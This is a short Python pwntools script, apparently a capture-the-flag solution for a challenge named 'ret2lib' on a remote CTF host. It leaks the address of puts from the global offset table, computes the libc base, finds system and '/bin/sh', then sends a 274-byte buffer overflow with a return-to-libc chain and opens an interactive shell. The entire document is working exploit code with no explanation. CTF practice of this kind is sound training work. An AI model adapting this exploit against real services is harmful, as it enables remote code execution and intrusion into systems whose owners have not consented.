#!/usr/bin/env python
from pwn import *


r = remote('ctf.racterub.me', 3005)
#r = remote('0.0.0.0', 8888)
context.log_level = 'debug'

elf = ELF('./ret2lib')
libc = ELF('./libc.so.6')

r.recvuntil(':')
r.sendline(hex(elf.got['puts']))
r.recvuntil('address : ')
puts_addr = int(r.recvuntil('\n').strip(), 16)
base = puts_addr - libc.symbols['puts']
system = base + libc.symbols['system']
sh = base + libc.search('/bin/sh').next()
print '[+] base addr :', base
print '[+] system addr :', system
print '[+] puts addr :', puts_addr
r.recvuntil('me :')
r.sendline('a'*274 + p32(system) + p32(0xdeadbeef) + p32(sh))
r.interactive()
r.close()
